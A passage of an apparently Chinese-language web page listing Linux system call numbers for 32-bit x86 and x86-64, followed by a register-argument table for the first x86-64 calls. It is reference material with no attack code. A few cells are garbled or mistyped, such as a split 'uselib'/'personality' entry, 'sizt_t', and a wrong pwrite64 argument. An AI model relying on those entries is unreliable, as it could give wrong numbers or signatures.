d><td>54</td></tr><tr><td>fcntl</td><td>55</td><td>mpx</td><td>56</td></tr><tr><td>setpgid</td><td>57</td><td>ulimit</td><td>58</td></tr><tr><td>oldolduname</td><td>59</td><td>umask</td><td>60</td></tr><tr><td>chroot</td><td>61</td><td>ustat</td><td>62</td></tr><tr><td>dup2</td><td>63</td><td>getppid</td><td>64</td></tr><tr><td>getpgrp</td><td>65</td><td>setsid</td><td>66</td></tr><tr><td>sigaction</td><td>67</td><td>sgetmask</td><td>68</td></tr><tr><td>ssetmask</td><td>69</td><td>setreuid</td><td>70</td></tr><tr><td>setregid</td><td>71</td><td>sigsuspend</td><td>72</td></tr><tr><td>sigpending</td><td>73</td><td>sethostname</td><td>74</td></tr><tr><td>setrlimit</td><td>75</td><td>getrlimit</td><td>76</td></tr><tr><td>getrusage</td><td>77</td><td>gettimeofday</td><td>78</td></tr><tr><td>settimeofday</td><td>79</td><td>getgroups</td><td>80</td></tr><tr><td>setgroups</td><td>81</td><td>select</td><td>82</td></tr><tr><td>symlink</td><td>83</td><td>oldlstat</td><td>84</td></tr><tr><td>readlink</td><td>85</td><td>uselib</td><td>86</td></tr><tr><td>swapon</td><td>87</td><td>reboot</td><td>88</td></tr><tr><td>readdir</td><td>89</td><td>mmap</td><td>90</td></tr><tr><td>munmap</td><td>91</td><td>truncate</td><td>92</td></tr><tr><td>ftruncate</td><td>93</td><td>fchmod</td><td>94</td></tr><tr><td>fchown</td><td>95</td><td>getpriority</td><td>96</td></tr><tr><td>setpriority</td><td>97</td><td>profil</td><td>98</td></tr><tr><td>statfs</td><td>99</td><td>fstatfs</td><td>100</td></tr><tr><td>ioperm</td><td>101</td><td>socketcall</td><td>102</td></tr><tr><td>syslog</td><td>103</td><td>setitimer</td><td>104</td></tr><tr><td>getitimer</td><td>105</td><td>stat</td><td>106</td></tr><tr><td>lstat</td><td>107</td><td>fstat</td><td>108</td></tr><tr><td>olduname</td><td>109</td><td>iopl</td><td>110</td></tr><tr><td>vhangup</td><td>111</td><td>idle</td><td>112</td></tr><tr><td>vm86old</td><td>113</td><td>wait4</td><td>114</td></tr><tr><td>swapoff</td><td>115</td><td>sysinfo</td><td>116</td></tr><tr><td>ipc</td><td>117</td><td>fsync</td><td>118</td></tr><tr><td>sigreturn</td><td>119</td><td>clone</td><td>120</td></tr><tr><td>setdomainname</td><td>121</td><td>uname</td><td>122</td></tr><tr><td>modify_ldt</td><td>123</td><td>adjtimex</td><td>124</td></tr><tr><td>mprotect</td><td>125</td><td>sigprocmask</td><td>126</td></tr><tr><td>create_module</td><td>127</td><td>init_module</td><td>128</td></tr><tr><td>delete_module</td><td>129</td><td>get_kernel_syms</td><td>130</td></tr><tr><td>quotactl</td><td>131</td><td>getpgid</td><td>132</td></tr><tr><td>fchdir</td><td>133</td><td>bdflush</td><td>134</td></tr><tr><td>sysfs</td><td>135</td><td>personality</td><td>136</td></tr><tr><td>afs_syscall</td><td>137</td><td>setfsuid</td><td>138</td></tr><tr><td>setfsgid</td><td>139</td><td>_llseek</td><td>140</td></tr><tr><td>getdents</td><td>141</td><td>_newselect</td><td>142</td></tr><tr><td>flock</td><td>143</td><td>msync</td><td>144</td></tr><tr><td>readv</td><td>145</td><td>writev</td><td>146</td></tr><tr><td>getsid</td><td>147</td><td>fdatasync</td><td>148</td></tr><tr><td>_sysctl</td><td>149</td><td>mlock</td><td>150</td></tr><tr><td>munlock</td><td>151</td><td>mlockall</td><td>152</td></tr><tr><td>munlockall</td><td>153</td><td>sched_setparam</td><td>154</td></tr><tr><td>sched_getparam</td><td>155</td><td>sched_setscheduler</td><td>156</td></tr><tr><td>sched_getscheduler</td><td>157</td><td>sched_yield</td><td>158</td></tr><tr><td>sched_get_priority_max</td><td>159</td><td>sched_get_priority_min</td><td>160</td></tr><tr><td>sched_rr_get_interval</td><td>161</td><td>nanosleep</td><td>162</td></tr><tr><td>mremap</td><td>163</td><td>setresuid</td><td>164</td></tr><tr><td>getresuid</td><td>165</td><td>vm86</td><td>166</td></tr><tr><td>query_module</td><td>167</td><td>poll</td><td>168</td></tr><tr><td>nfsservctl</td><td>169</td><td>setresgid</td><td>170</td></tr><tr><td>getresgid</td><td>171</td><td>prctl</td><td>172</td></tr><tr><td>rt_sigreturn</td><td>173</td><td>rt_sigaction</td><td>174</td></tr><tr><td>rt_sigprocmask</td><td>175</td><td>rt_sigpending</td><td>176</td></tr><tr><td>rt_sigtimedwait</td><td>177</td><td>rt_sigqueueinfo</td><td>178</td></tr><tr><td>rt_sigsuspend</td><td>179</td><td>pread64</td><td>180</td></tr><tr><td>pwrite64</td><td>181</td><td>chown</td><td>182</td></tr><tr><td>getcwd</td><td>183</td><td>capget</td><td>184</td></tr><tr><td>capset</td><td>185</td><td>sigaltstack</td><td>186</td></tr><tr><td>sendfile</td><td>187</td><td>getpmsg</td><td>188</td></tr><tr><td>putpmsg</td><td>189</td><td>vfork</td><td>190</td></tr><tr><td>ugetrlimit</td><td>191</td><td>mmap2</td><td>192</td></tr><tr><td>truncate64</td><td>193</td><td>ftruncate64</td><td>194</td></tr><tr><td>stat64</td><td>195</td><td>lstat64</td><td>196</td></tr><tr><td>fstat64</td><td>197</td><td>lchown32</td><td>198</td></tr><tr><td>getuid32</td><td>199</td><td>getgid32</td><td>200</td></tr><tr><td>geteuid32</td><td>201</td><td>getegid32</td><td>202</td></tr><tr><td>setreuid32</td><td>203</td><td>setregid32</td><td>204</td></tr><tr><td>getgroups32</td><td>205</td><td>setgroups32</td><td>206</td></tr><tr><td>fchown32</td><td>207</td><td>setresuid32</td><td>208</td></tr><tr><td>getresuid32</td><td>209</td><td>setresgid32</td><td>210</td></tr><tr><td>getresgid32</td><td>211</td><td>chown32</td><td>212</td></tr><tr><td>setuid32</td><td>213</td><td>setgid32</td><td>214</td></tr><tr><td>setfsuid32</td><td>215</td><td>setfsgid32</td><td>216</td></tr><tr><td>pivot_root</td><td>217</td><td>mincore</td><td>218</td></tr><tr><td>madvise</td><td>219</td><td>madvise1</td><td>219</td></tr><tr><td>getdents64</td><td>220</td><td>⏫delete when C</td><td>lib stub is removed</td></tr><tr><td>fcntl64</td><td>221</td><td>gettid</td><td>224</td></tr><tr><td>readahead</td><td>225</td><td>setxattr</td><td>226</td></tr><tr><td>lsetxattr</td><td>227</td><td>fsetxattr</td><td>228</td></tr><tr><td>getxattr</td><td>229</td><td>lgetxattr</td><td>230</td></tr><tr><td>fgetxattr</td><td>231</td><td>listxattr</td><td>232</td></tr><tr><td>llistxattr</td><td>233</td><td>flistxattr</td><td>234</td></tr><tr><td>removexattr</td><td>235</td><td>lremovexattr</td><td>236</td></tr><tr><td>fremovexattr</td><td>237</td><td>tkill</td><td>238</td></tr><tr><td>sendfile64</td><td>239</td><td>futex</td><td>240</td></tr><tr><td>sched_setaffinity</td><td>241</td><td>sched_getaffinity</td><td>242</td></tr><tr><td>set_thread_area</td><td>243</td><td>get_thread_area</td><td>244</td></tr><tr><td>io_setup</td><td>245</td><td>io_destroy</td><td>246</td></tr><tr><td>io_getevents</td><td>247</td><td>io_submit</td><td>248</td></tr><tr><td>io_cancel</td><td>249</td><td>fadvise64</td><td>250</td></tr><tr><td></td><td></td><td>exit_group</td><td>252</td></tr><tr><td>lookup_dcookie</td><td>253</td><td>epoll_create</td><td>254</td></tr><tr><td>epoll_ctl</td><td>255</td><td>epoll_wait</td><td>256</td></tr><tr><td>remap_file_pages</td><td>257</td><td>set_tid_address</td><td>258</td></tr><tr><td>timer_create</td><td>259</td><td>timer_settime</td><td>260</td></tr><tr><td>timer_gettime</td><td>261</td><td>timer_getoverrun</td><td>262</td></tr><tr><td>timer_delete</td><td>263</td><td>clock_settime</td><td>264</td></tr><tr><td>clock_gettime</td><td>265</td><td>clock_getres</td><td>266</td></tr><tr><td>clock_nanosleep</td><td>267</td><td>statfs64</td><td>268</td></tr><tr><td>fstatfs64</td><td>269</td><td>tgkill</td><td>270</td></tr><tr><td>utimes</td><td>271</td><td>fadvise64_64</td><td>272</td></tr><tr><td>vserver</td><td>273</td><td>mbind</td><td>274</td></tr><tr><td>get_mempolicy</td><td>275</td><td>set_mempolicy</td><td>276</td></tr><tr><td>mq_open</td><td>277</td><td>mq_unlink</td><td>278</td></tr><tr><td>mq_timedsend</td><td>279</td><td>mq_timedreceive</td><td>280</td></tr><tr><td>mq_notify</td><td>281</td><td>mq_getsetattr</td><td>282</td></tr><tr><td>kexec_load</td><td>283</td><td>waitid</td><td>284</td></tr><tr><td>sys_setaltroot</td><td>285</td><td>add_key</td><td>286</td></tr><tr><td>request_key</td><td>287</td><td>keyctl</td><td>288</td></tr><tr><td>ioprio_set</td><td>289</td><td>ioprio_get</td><td>290</td></tr><tr><td>inotify_init</td><td>291</td><td>inotify_add_watch</td><td>292</td></tr><tr><td>inotify_rm_watch</td><td>293</td><td>migrate_pages</td><td>294</td></tr><tr><td>openat</td><td>295</td><td>mkdirat</td><td>296</td></tr><tr><td>mknodat</td><td>297</td><td>fchownat</td><td>298</td></tr><tr><td>futimesat</td><td>299</td><td>fstatat64</td><td>300</td></tr><tr><td>unlinkat</td><td>301</td><td>renameat</td><td>302</td></tr><tr><td>linkat</td><td>303</td><td>symlinkat</td><td>304</td></tr><tr><td>readlinkat</td><td>305</td><td>fchmodat</td><td>306</td></tr><tr><td>faccessat</td><td>307</td><td>pselect6</td><td>308</td></tr><tr><td>ppoll</td><td>309</td><td>unshare</td><td>310</td></tr><tr><td>set_robust_list</td><td>311</td><td>get_robust_list</td><td>312</td></tr><tr><td>splice</td><td>313</td><td>sync_file_range</td><td>314</td></tr><tr><td>tee</td><td>315</td><td>vmsplice</td><td>316</td></tr><tr><td>move_pages</td><td>317</td><td>getcpu</td><td>318</td></tr><tr><td>epoll_pwait</td><td>319</td><td>utimensat</td><td>320</td></tr><tr><td>signalfd</td><td>321</td><td>timerfd_create</td><td>322</td></tr><tr><td>eventfd</td><td>323</td><td>fallocate</td><td>324</td></tr><tr><td>timerfd_settime</td><td>325</td><td>timerfd_gettime</td><td>326</td></tr><tr><td>signalfd4</td><td>327</td><td>eventfd2</td><td>328</td></tr><tr><td>epoll_create1</td><td>329</td><td>dup3</td><td>330</td></tr><tr><td>pipe2</td><td>331</td><td>inotify_init1</td><td>332</td></tr><tr><td>preadv</td><td>333</td><td>pwritev</td><td>334</td></tr><tr><td>rt_tgsigqueueinfo</td><td>335</td><td>perf_event_open</td><td>336</td></tr><tr><td>recvmmsg</td><td>337</td><td>fanotify_init</td><td>338</td></tr><tr><td>fanotify_mark</td><td>339</td><td>prlimit64</td><td>340</td></tr><tr><td>name_to_handle_at</td><td>341</td><td>open_by_handle_at</td><td>342</td></tr><tr><td>clock_adjtime</td><td>343</td><td>syncfs</td><td>344</td></tr><tr><td>sendmmsg</td><td>345</td><td>set_ns</td><td>346</td></tr><tr><td>process_vm_readv</td><td>347</td><td>process_vm_writev</td><td>348</td></tr></tbody></table><h2 id="syscall系统调用号"><a href="#syscall系统调用号" class="headerlink" title="syscall系统调用号"></a>syscall系统调用号</h2><table><thead><tr><th>系统调用</th><th>调用号</th><th>系统调用</th><th>调用号</th></tr></thead><tbody><tr><td>read</td><td>0</td><td>write</td><td>1</td></tr><tr><td>open</td><td>2</td><td>close</td><td>3</td></tr><tr><td>stat</td><td>4</td><td>fstat</td><td>5</td></tr><tr><td>lstat</td><td>6</td><td>poll</td><td>7</td></tr><tr><td>lseek</td><td>8</td><td>mmap</td><td>9</td></tr><tr><td>mprotect</td><td>10</td><td>munmap</td><td>11</td></tr><tr><td>brk</td><td>12</td><td>rt_sigaction</td><td>13</td></tr><tr><td>rt_sigprocmask</td><td>14</td><td>rt_sigreturn</td><td>15</td></tr><tr><td>ioctl</td><td>16</td><td>pread64</td><td>17</td></tr><tr><td>pwrite64</td><td>18</td><td>readv</td><td>19</td></tr><tr><td>writev</td><td>20</td><td>access</td><td>21</td></tr><tr><td>pipe</td><td>22</td><td>select</td><td>23</td></tr><tr><td>sched_yield</td><td>24</td><td>mremap</td><td>25</td></tr><tr><td>msync</td><td>26</td><td>mincore</td><td>27</td></tr><tr><td>madvise</td><td>28</td><td>shmget</td><td>29</td></tr><tr><td>shmat</td><td>30</td><td>shmctl</td><td>31</td></tr><tr><td>dup</td><td>32</td><td>dup2</td><td>33</td></tr><tr><td>pause</td><td>34</td><td>nanosleep</td><td>35</td></tr><tr><td>getitimer</td><td>36</td><td>alarm</td><td>37</td></tr><tr><td>setitimer</td><td>38</td><td>getpid</td><td>39</td></tr><tr><td>sendfile</td><td>40</td><td>socket</td><td>41</td></tr><tr><td>connect</td><td>42</td><td>accept</td><td>43</td></tr><tr><td>sendto</td><td>44</td><td>recvfrom</td><td>45</td></tr><tr><td>sendmsg</td><td>46</td><td>recvmsg</td><td>47</td></tr><tr><td>shutdown</td><td>48</td><td>bind</td><td>49</td></tr><tr><td>listen</td><td>50</td><td>getsockname</td><td>51</td></tr><tr><td>getpeername</td><td>52</td><td>socketpair</td><td>53</td></tr><tr><td>setsockopt</td><td>54</td><td>getsockopt</td><td>55</td></tr><tr><td>clone</td><td>56</td><td>fork</td><td>57</td></tr><tr><td>vfork</td><td>58</td><td>execve</td><td>59</td></tr><tr><td>exit</td><td>60</td><td>wait4</td><td>61</td></tr><tr><td>kill</td><td>62</td><td>uname</td><td>63</td></tr><tr><td>semget</td><td>64</td><td>semop</td><td>65</td></tr><tr><td>semctl</td><td>66</td><td>shmdt</td><td>67</td></tr><tr><td>msgget</td><td>68</td><td>msgsnd</td><td>69</td></tr><tr><td>msgrcv</td><td>70</td><td>msgctl</td><td>71</td></tr><tr><td>fcntl</td><td>72</td><td>flock</td><td>73</td></tr><tr><td>fsync</td><td>74</td><td>fdatasync</td><td>75</td></tr><tr><td>truncate</td><td>76</td><td>ftruncate</td><td>77</td></tr><tr><td>getdents</td><td>78</td><td>getcwd</td><td>79</td></tr><tr><td>chdir</td><td>80</td><td>fchdir</td><td>81</td></tr><tr><td>rename</td><td>82</td><td>mkdir</td><td>83</td></tr><tr><td>rmdir</td><td>84</td><td>creat</td><td>85</td></tr><tr><td>link</td><td>86</td><td>unlink</td><td>87</td></tr><tr><td>symlink</td><td>88</td><td>readlink</td><td>89</td></tr><tr><td>chmod</td><td>90</td><td>fchmod</td><td>91</td></tr><tr><td>chown</td><td>92</td><td>fchown</td><td>93</td></tr><tr><td>lchown</td><td>94</td><td>umask</td><td>95</td></tr><tr><td>gettimeofday</td><td>96</td><td>getrlimit</td><td>97</td></tr><tr><td>getrusage</td><td>98</td><td>sysinfo</td><td>99</td></tr><tr><td>times</td><td>100</td><td>ptrace</td><td>101</td></tr><tr><td>getuid</td><td>102</td><td>syslog</td><td>103</td></tr><tr><td>getgid</td><td>104</td><td>setuid</td><td>105</td></tr><tr><td>setgid</td><td>106</td><td>geteuid</td><td>107</td></tr><tr><td>getegid</td><td>108</td><td>setpgid</td><td>109</td></tr><tr><td>getppid</td><td>110</td><td>getpgrp</td><td>111</td></tr><tr><td>setsid</td><td>112</td><td>setreuid</td><td>113</td></tr><tr><td>setregid</td><td>114</td><td>getgroups</td><td>115</td></tr><tr><td>setgroups</td><td>116</td><td>setresuid</td><td>117</td></tr><tr><td>getresuid</td><td>118</td><td>setresgid</td><td>119</td></tr><tr><td>getresgid</td><td>120</td><td>getpgid</td><td>121</td></tr><tr><td>setfsuid</td><td>122</td><td>setfsgid</td><td>123</td></tr><tr><td>getsid</td><td>124</td><td>capget</td><td>125</td></tr><tr><td>capset</td><td>126</td><td>rt_sigpending</td><td>127</td></tr><tr><td>rt_sigtimedwait</td><td>128</td><td>rt_sigqueueinfo</td><td>129</td></tr><tr><td>rt_sigsuspend</td><td>130</td><td>sigaltstack</td><td>131</td></tr><tr><td>utime</td><td>132</td><td>mknod</td><td>133</td></tr><tr><td>uselib</td><td>13</td><td>4personality</td><td>135</td></tr><tr><td>ustat</td><td>136</td><td>statfs</td><td>137</td></tr><tr><td>fstatfs</td><td>138</td><td>sysfs</td><td>139</td></tr><tr><td>getpriority</td><td>140</td><td>setpriority</td><td>141</td></tr><tr><td>sched_setparam</td><td>142</td><td>sched_getparam</td><td>143</td></tr><tr><td>sched_setscheduler</td><td>144</td><td>sched_getscheduler</td><td>145</td></tr><tr><td>sched_get_priority_max</td><td>146</td><td>sched_get_priority_min</td><td>147</td></tr><tr><td>sched_rr_get_interval</td><td>148</td><td>mlock</td><td>149</td></tr><tr><td>munlock</td><td>150</td><td>mlockall</td><td>151</td></tr><tr><td>munlockall</td><td>152</td><td>vhangup</td><td>153</td></tr><tr><td>modify_ldt</td><td>154</td><td>pivot_root</td><td>155</td></tr><tr><td>_sysctl</td><td>156</td><td>prctl</td><td>157</td></tr><tr><td>arch_prctl</td><td>158</td><td>adjtimex</td><td>159</td></tr><tr><td>setrlimit</td><td>160</td><td>chroot</td><td>161</td></tr><tr><td>sync</td><td>162</td><td>acct</td><td>163</td></tr><tr><td>settimeofday</td><td>164</td><td>mount</td><td>165</td></tr><tr><td>umount2</td><td>166</td><td>swapon</td><td>167</td></tr><tr><td>swapoff</td><td>168</td><td>reboot</td><td>169</td></tr><tr><td>sethostname</td><td>170</td><td>setdomainname</td><td>171</td></tr><tr><td>iopl</td><td>172</td><td>ioperm</td><td>173</td></tr><tr><td>create_module</td><td>174</td><td>init_module</td><td>175</td></tr><tr><td>delete_module</td><td>176</td><td>get_kernel_syms</td><td>177</td></tr><tr><td>query_module</td><td>178</td><td>quotactl</td><td>179</td></tr><tr><td>nfsservctl</td><td>180</td><td>getpmsg</td><td>181</td></tr><tr><td>putpmsg</td><td>182</td><td>afs_syscall</td><td>183</td></tr><tr><td>tuxcall</td><td>184</td><td>security</td><td>185</td></tr><tr><td>gettid</td><td>186</td><td>readahead</td><td>187</td></tr><tr><td>setxattr</td><td>188</td><td>lsetxattr</td><td>189</td></tr><tr><td>fsetxattr</td><td>190</td><td>getxattr</td><td>191</td></tr><tr><td>lgetxattr</td><td>192</td><td>fgetxattr</td><td>193</td></tr><tr><td>listxattr</td><td>194</td><td>llistxattr</td><td>195</td></tr><tr><td>flistxattr</td><td>196</td><td>removexattr</td><td>197</td></tr><tr><td>lremovexattr</td><td>198</td><td>fremovexattr</td><td>199</td></tr><tr><td>tkill</td><td>200</td><td>time</td><td>201</td></tr><tr><td>futex</td><td>202</td><td>sched_setaffinity</td><td>203</td></tr><tr><td>sched_getaffinity</td><td>204</td><td>set_thread_area</td><td>205</td></tr><tr><td>io_setup</td><td>206</td><td>io_destroy</td><td>207</td></tr><tr><td>io_getevents</td><td>208</td><td>io_submit</td><td>209</td></tr><tr><td>io_cancel</td><td>210</td><td>get_thread_area</td><td>211</td></tr><tr><td>lookup_dcookie</td><td>212</td><td>epoll_create</td><td>213</td></tr><tr><td>epoll_ctl_old</td><td>214</td><td>epoll_wait_old</td><td>215</td></tr><tr><td>remap_file_pages</td><td>216</td><td>getdents64</td><td>217</td></tr><tr><td>set_tid_address</td><td>218</td><td>restart_syscall</td><td>219</td></tr><tr><td>semtimedop</td><td>220</td><td>fadvise64</td><td>221</td></tr><tr><td>timer_create</td><td>222</td><td>timer_settime</td><td>223</td></tr><tr><td>timer_gettime</td><td>224</td><td>timer_getoverrun</td><td>225</td></tr><tr><td>timer_delete</td><td>226</td><td>clock_settime</td><td>227</td></tr><tr><td>clock_gettime</td><td>228</td><td>clock_getres</td><td>229</td></tr><tr><td>clock_nanosleep</td><td>230</td><td>exit_group</td><td>231</td></tr><tr><td>epoll_wait</td><td>232</td><td>epoll_ctl</td><td>233</td></tr><tr><td>tgkill</td><td>234</td><td>utimes</td><td>235</td></tr><tr><td>vserver</td><td>236</td><td>mbind</td><td>237</td></tr><tr><td>set_mempolicy</td><td>238</td><td>get_mempolicy</td><td>239</td></tr><tr><td>mq_open</td><td>240</td><td>mq_unlink</td><td>241</td></tr><tr><td>mq_timedsend</td><td>242</td><td>mq_timedreceive</td><td>243</td></tr><tr><td>mq_notify</td><td>244</td><td>mq_getsetattr</td><td>245</td></tr><tr><td>kexec_load</td><td>246</td><td>waitid</td><td>247</td></tr><tr><td>add_key</td><td>248</td><td>request_key</td><td>249</td></tr><tr><td>keyctl</td><td>250</td><td>ioprio_set</td><td>251</td></tr><tr><td>ioprio_get</td><td>252</td><td>inotify_init</td><td>253</td></tr><tr><td>inotify_add_watch</td><td>254</td><td>inotify_rm_watch</td><td>255</td></tr><tr><td>migrate_pages</td><td>256</td><td>openat</td><td>257</td></tr><tr><td>mkdirat</td><td>258</td><td>mknodat</td><td>259</td></tr><tr><td>fchownat</td><td>260</td><td>futimesat</td><td>261</td></tr><tr><td>newfstatat</td><td>262</td><td>unlinkat</td><td>263</td></tr><tr><td>renameat</td><td>264</td><td>linkat</td><td>265</td></tr><tr><td>symlinkat</td><td>266</td><td>readlinkat</td><td>267</td></tr><tr><td>fchmodat</td><td>268</td><td>faccessat</td><td>269</td></tr><tr><td>pselect6</td><td>270</td><td>ppoll</td><td>271</td></tr><tr><td>unshare</td><td>272</td><td>set_robust_list</td><td>273</td></tr><tr><td>get_robust_list</td><td>274</td><td>splice</td><td>275</td></tr><tr><td>tee</td><td>276</td><td>sync_file_range</td><td>277</td></tr><tr><td>vmsplice</td><td>278</td><td>move_pages</td><td>279</td></tr><tr><td>utimensat</td><td>280</td><td>epoll_pwait</td><td>281</td></tr><tr><td>signalfd</td><td>282</td><td>timerfd_create</td><td>283</td></tr><tr><td>eventfd</td><td>284</td><td>fallocate</td><td>285</td></tr><tr><td>timerfd_settime</td><td>286</td><td>timerfd_gettime</td><td>287</td></tr><tr><td>accept4</td><td>288</td><td>signalfd4</td><td>289</td></tr><tr><td>eventfd2</td><td>290</td><td>epoll_create1</td><td>291</td></tr><tr><td>dup3</td><td>292</td><td>pipe2</td><td>293</td></tr><tr><td>inotify_init1</td><td>294</td><td>preadv</td><td>295</td></tr><tr><td>pwritev</td><td>296</td><td>rt_tgsigqueueinfo</td><td>297</td></tr><tr><td>perf_event_open</td><td>298</td><td>recvmmsg</td><td>299</td></tr><tr><td>fanotify_init</td><td>300</td><td>fanotify_mark</td><td>301</td></tr><tr><td>prlimit64</td><td>302</td><td>name_to_handle_at</td><td>303</td></tr><tr><td>open_by_handle_at</td><td>304</td><td>clock_adjtime</td><td>305</td></tr><tr><td>syncfs</td><td>306</td><td>sendmmsg</td><td>307</td></tr><tr><td>set_ns</td><td>308</td><td>get_cpu</td><td>309</td></tr><tr><td>process_vm_readv</td><td>310</td><td>process_vm_writev</td><td>311</td></tr></tbody></table><h1 id="系统调用详解"><a href="#系统调用详解" class="headerlink" title="系统调用详解"></a>系统调用详解</h1><table>  <thead>    <tr>      <th>rax</th>      <th>System Call</th>      <th>rdi</th>      <th>rsi</th>      <th>rdx</th>      <th>r10</th>      <th>r8</th>      <th>r9</th>    </tr>  </thead>  <tbody>    <tr>      <th scope="row" data-label="rax">0</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/read" target="_blank">          sys_read        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">char* buf</td>      <td data-label="rdx">size_t count</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">1</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/write" target="_blank">          sys_write        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">const char* buf</td>      <td data-label="rdx">size_t count</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">2</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/open" target="_blank">          sys_open        </a>      </td>      <td data-label="rdi">const char* filename</td>      <td data-label="rsi">int flags</td>      <td data-label="rdx">int mode</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">3</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/close" target="_blank">          sys_close        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">4</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/stat" target="_blank">          sys_stat        </a>      </td>      <td data-label="rdi">const char* filename</td>      <td data-label="rsi">struct stat* statbuf</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">5</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fstat" target="_blank">          sys_fstat        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">struct stat* statbuf</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">6</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/lstat" target="_blank">          sys_lstat        </a>      </td>      <td data-label="rdi">const char* filename</td>      <td data-label="rsi">struct stat* statbuf</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">7</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/poll" target="_blank">          sys_poll        </a>      </td>      <td data-label="rdi">struct poll_fd* ufds</td>      <td data-label="rsi">unsigned int nfds</td>      <td data-label="rdx">long timeout_msecs</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">8</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/lseek" target="_blank">          sys_lseek        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">off_t offset</td>      <td data-label="rdx">unsigned int origin</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">9</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mmap" target="_blank">          sys_mmap        </a>      </td>      <td data-label="rdi">unsigned long addr</td>      <td data-label="rsi">unsigned long len</td>      <td data-label="rdx">unsigned long prot</td>      <td data-label="r10">unsigned long flags</td>      <td data-label="r8">unsigned long fd</td>      <td data-label="r9">unsigned long off</td>    </tr>    <tr>      <th scope="row" data-label="rax">10</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mprotect" target="_blank">          sys_mprotect        </a>      </td>      <td data-label="rdi">unsigned long start</td>      <td data-label="rsi">size_t len</td>      <td data-label="rdx">unsigned long prot</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">11</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/munmap" target="_blank">          sys_munmap        </a>      </td>      <td data-label="rdi">unsigned long addr</td>      <td data-label="rsi">size_t len</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">12</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/brk" target="_blank">          sys_brk        </a>      </td>      <td data-label="rdi">unsigned long brk</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">13</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/rt_sigaction" target="_blank">          sys_rt_sigaction        </a>      </td>      <td data-label="rdi">int sig</td>      <td data-label="rsi">const struct sigaction* act</td>      <td data-label="rdx">struct sigaction* oact</td>      <td data-label="r10">sizt_t sigsetsize</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">14</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/rt_sigprocmask" target="_blank">          sys_rt_sigprocmask        </a>      </td>      <td data-label="rdi">int how</td>      <td data-label="rsi">sigset_t* nset</td>      <td data-label="rdx">sigset_t* oset</td>      <td data-label="r10">sizt_t sigsetsize</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">15</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/rt_sigreturn" target="_blank">          sys_rt_sigreturn        </a>      </td>      <td data-label="rdi">unsigned long _unused</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">16</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/ioctl" target="_blank">          sys_ioctl        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">unsigned int cmd</td>      <td data-label="rdx">unsigned long arg</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">17</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/pread64" target="_blank">          sys_pread64        </a>      </td>      <td data-label="rdi">unsigned long fd</td>      <td data-label="rsi">char* buf</td>      <td data-label="rdx">size_t count</td>      <td data-label="r10">off_t pos</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">18</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/pwrite64" target="_blank">          sys_pwrite64        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">const char* fd</td>      <td data-label="rdx">sizt_t count</td>      <td data-label="r10">off_t pos</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    